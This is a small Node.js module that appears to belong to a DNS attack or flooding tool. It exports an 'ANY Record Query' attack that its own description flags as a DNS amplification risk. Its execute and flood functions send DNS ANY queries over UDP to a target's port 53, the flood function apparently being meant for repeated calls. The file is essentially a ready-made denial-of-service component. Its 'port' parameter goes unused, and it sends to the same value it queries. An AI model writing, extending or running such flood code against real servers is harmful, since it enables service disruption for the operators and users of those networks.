const dgram = require('dgram');
const dnsPacket = require('dns-packet');

module.exports = {
    name: 'ANY Record Query',
    description: 'Queries all records (DNS amplification risk)',
    
    execute: async (target, port) => {
        return new Promise((resolve, reject) => {
            const socket = dgram.createSocket('udp4');
            const query = dnsPacket.encode({
                type: 'query',
                id: Math.floor(Math.random() * 65535),
                questions: [{ name: target, type: 'ANY', class: 'IN' }]
            });
            
            socket.send(query, 53, target, (err) => {
                if (err) reject(err);
                else resolve({ sent: true, queryType: 'ANY' });
                socket.close();
            });
        });
    },
    
    flood: (target, port, callback) => {
        const socket = dgram.createSocket('udp4');
        const query = dnsPacket.encode({
            type: 'query',
            id: Math.floor(Math.random() * 65535),
            questions: [{ name: target, type: 'ANY', class: 'IN' }]
        });
        
        socket.send(query, 53, target, (err) => {
            socket.close();
            callback(!err);
        });
    }
};